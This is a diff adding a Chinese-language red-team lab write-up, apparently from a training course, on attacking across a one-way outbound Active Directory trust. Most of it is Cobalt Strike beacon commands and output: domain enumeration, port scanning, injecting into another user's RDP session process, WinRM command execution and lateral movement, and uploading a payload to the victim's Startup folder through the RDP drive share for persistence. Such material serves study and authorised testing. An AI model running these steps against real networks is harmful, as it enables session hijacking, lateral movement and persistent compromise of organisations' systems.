@@ -294,3 +294,214 @@ beacon> ls \\ad.subsidiary.external\c$
           dir     02/10/2021 03:23:44   Boot
           dir     10/18/2016 01:59:39   Documents and Settings
 ```
+
+
+# One-Way (Outbound)
+
+如果域A单向信任域B，那么B可以访问A的资源，A理论上应该不可以访问域B的资源。这一章讨论域A如何在这一前提下访问域B
+
+一个方法是域信任的相反方向上创建的 SQL Server 链接（参考MS SQL Servers那一章）
+
+另一个方法是通过 RDP 驱动器共享（ RDP drive sharing）
+
+cyberbotic.io（上面例子里的A域）对zeropointsecurity.local（上面例子里的B域）有出站信任关系
+```
+beacon> powershell Get-DomainTrust -Domain cyberbotic.io
+
+SourceName      : cyberbotic.io
+TargetName      : zeropointsecurity.local
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : FOREST_TRANSITIVE
+TrustDirection  : Outbound
+WhenCreated     : 2/19/2021 10:15:24 PM
+WhenChanged     : 2/19/2021 10:15:24 PM
+```
+
+
+使用```Get-DomainForeignGroupMember```表明有一个```Jump Users```的用户组
+```
+beacon> powershell Get-DomainForeignGroupMember -Domain cyberbotic.io
+
+GroupDomain             : cyberbotic.io
+GroupName               : Jump Users
+GroupDistinguishedName  : CN=Jump Users,CN=Users,DC=cyberbotic,DC=io
+MemberDomain            : cyberbotic.io
+MemberName              : S-1-5-21-3022719512-2989052766-178205875-1115
+MemberDistinguishedName : CN=S-1-5-21-3022719512-2989052766-178205875-1115,CN=ForeignSecurityPrincipals,DC=cyberbotic,DC=io
+```
+
+BloodHound 将显示```Jump Users```对EXCH-1和SQL-1这两台机器有RDP权限
+
+![alt jump](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-trusts/jump-users-rdp.png?width=1920)
+
+Get-DomainGPOUserLocalGroupMapping 和 Find-DomainLocalGroupMember 可以显示和上面一样的结果
+
+```
+beacon> powershell Get-DomainGPOUserLocalGroupMapping -Identity "Jump Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
+
+sql-1.cyberbotic.io
+exch-1.cyberbotic.io
+```
+
+```
+beacon> powershell Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName
+
+sql-1.cyberbotic.io
+exch-1.cyberbotic.io
+```
+
+横向移动到sql-1.cyberbotic.io
+
+查看登录会话
+```
+beacon> getuid
+[*] You are NT AUTHORITY\SYSTEM (admin)
+
+beacon> run hostname
+sql-1
+
+beacon> net logons
+Logged on users at \\localhost:
+
+ZPS\jean.wise
+CYBER\SQL-1$
+```
+
+查看网络连接
+```
+beacon> shell netstat -anop tcp | findstr 3389
+
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1012
+  TCP    10.10.15.90:3389       10.10.18.221:50145     ESTABLISHED     1012
+```
+
+查看进程
+```
+beacon> ps
+
+ PID   PPID  Name                         Arch  Session     User
+ ---   ----  ----                         ----  -------     -----
+ 644   776   ShellExperienceHost.exe      x64   3           ZPS\jean.wise
+ 1012  696   svchost.exe                  x64   0           NT AUTHORITY\NETWORK SERVICE
+ 1788  776   SearchUI.exe                 x64   3           ZPS\jean.wise
+ 3080  776   RuntimeBroker.exe            x64   3           ZPS\jean.wise
+ 3124  3752  explorer.exe                 x64   3           ZPS\jean.wise
+ 4960  1012  rdpclip.exe                  x64   3           ZPS\jean.wise
+ 4980  696   svchost.exe                  x64   3           ZPS\jean.wise
+ 5008  1244  sihost.exe                   x64   3           ZPS\jean.wise
+ 5048  1244  taskhostw.exe                x64   3           ZPS\jean.wise
+```
+
+下面思考两个问题
+1. ```jean.wise```是否有任何特权访问```zeropointsecurity.local```
+2. 是否可以访问```zeropointsecurity.local```的445、3389、5985等端口
+
+关于第一个问题，基于目前的域信任（单向-出站）我们无法枚举任何有用信息
+第二个问题可以通过```portscan```查看
+```
+beacon> portscan 10.10.18.0/24 139,445,3389,5985 none 1024
+10.10.18.221:3389
+10.10.18.221:5985
+
+10.10.18.167:139
+10.10.18.167:445
+10.10.18.167:3389
+10.10.18.167:5985
+
+Scanner module is complete
+```
+
+从结果可知我们可以访问域```zeropointsecurity.local```上```dc01``` 和 ```sql01```两台机器上的一些有用的端口
+
+
+注入当前机器（sql-1.cyberbotic.io）上的```jean.wise```的进程
+```
+beacon> inject 4960 x64 tcp-local
+[+] established link to child beacon: 10.10.15.90
+```
+
+显示当前用户已经是```jean.wise```
+
+```
+beacon> getuid
+[*] You are ZPS\jean.wise
+```
+
+在当前用户下使用PowerView已经可以枚举到```zeropointsecurity.local```的域信息
+```
+beacon> powershell Get-Domain
+
+Forest                  : zeropointsecurity.local
+DomainControllers       : {dc01.zeropointsecurity.local}
+Children                : {}
+DomainMode              : Unknown
+DomainModeLevel         : 7
+Parent                  : 
+PdcRoleOwner            : dc01.zeropointsecurity.local
+RidRoleOwner            : dc01.zeropointsecurity.local
+InfrastructureRoleOwner : dc01.zeropointsecurity.local
+Name                    : zeropointsecurity.local
+```
+
+上面枚举之所以能成功，是因为我们在```zeropointsecurity.local```域的上下文中，我们没有跨信任执行任何身份验证，只是劫持了一个现有的经过身份验证的会话
+
+如果jean.wise对zeropointsecurity.local有特权访问，那么从该域上下文横向移动将是相当简单的。我们可以弄清楚这jean.wise是一个System Admins域组的成员，它是SQL01上本地Administrators的成员
+
+因为上面端口枚举显示445端口没有开放，但是5985是开放的，可以使用winrm，执行命令
+```
+beacon> remote-exec winrm sql01.zeropointsecurity.local whoami; hostname
+
+zps\jean.wise
+sql01
+```
+横向移动
+```
+beacon> jump winrm64 sql01.zeropointsecurity.local pivot-sql-1
+[+] established link to child beacon: 10.10.18.221
+```
+
+我在这里使用另一个 Pivot 侦听器，因为在 SQL01 上启用了 Windows 防火墙，我们无法将入站连接到 445（因此没有 SMB 侦听器）或其他任意端口，如 4444（因此没有 TCP 侦听器）。SQL-1 上未启用 Windows 防火墙，因此我们可以绑定到高端口并捕获来自 Pivot Listener 的反向连接
+
+如果在 SQL-1 上也启用了 Windows 防火墙，我们可能需要尝试使用```netsh```
+
+即使jean.wise不是 SQL01 上的本地管理员,仍然可以通过已建立的 RDP 通道横向移动。这就是驱动器共享发挥作用的地方
+
+在```jean.wiseSQL-1 ```上的 RDP 会话中，有一个名为 UNC 路径```tsclient```
+
+它为通过 RDP 共享的每个驱动器都有一个挂载点。```\\tsclient\c```是 RDP 会话的原始计算机上的 ```C: 驱动器```，在这种情况下```sql01.zeropointsecurity.local```
+
+```
+beacon> ls \\tsclient\c
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     02/10/2021 04:11:30   $Recycle.Bin
+          dir     02/10/2021 03:23:44   Boot
+          dir     02/20/2021 10:15:23   Config.Msi
+          dir     10/18/2016 01:59:39   Documents and Settings
+          dir     02/23/2018 11:06:05   PerfLogs
+          dir     02/20/2021 10:14:59   Program Files
+          dir     02/20/2021 10:13:41   Program Files (x86)
+          dir     03/10/2021 17:19:54   ProgramData
+          dir     10/18/2016 02:01:27   Recovery
+          dir     02/20/2021 10:00:17   SQL2019
+          dir     02/17/2021 18:47:03   System Volume Information
+          dir     03/16/2021 15:24:24   Users
+          dir     02/17/2021 18:47:20   Windows
+ 379kb    fil     01/28/2021 07:09:16   bootmgr
+ 1b       fil     07/16/2016 13:18:08   BOOTNXT
+ 1gb      fil     03/16/2021 14:22:21   pagefile.sys
+```
+
+我们可以上传一个有效载荷，例如 bat 或 exe 到jean.wise的启动文件夹。下次他们登录时，payload文件自动执行，我们得到一个 shell
+
+```
+beacon> cd \\tsclient\c\Users\jean.wise\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+beacon> upload C:\Payloads\pivot.exe
+beacon> ls
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+ 174b     fil     05/15/2021 19:00:25   desktop.ini
+ 281kb    fil     05/15/2021 20:31:00   pivot.exe
+```
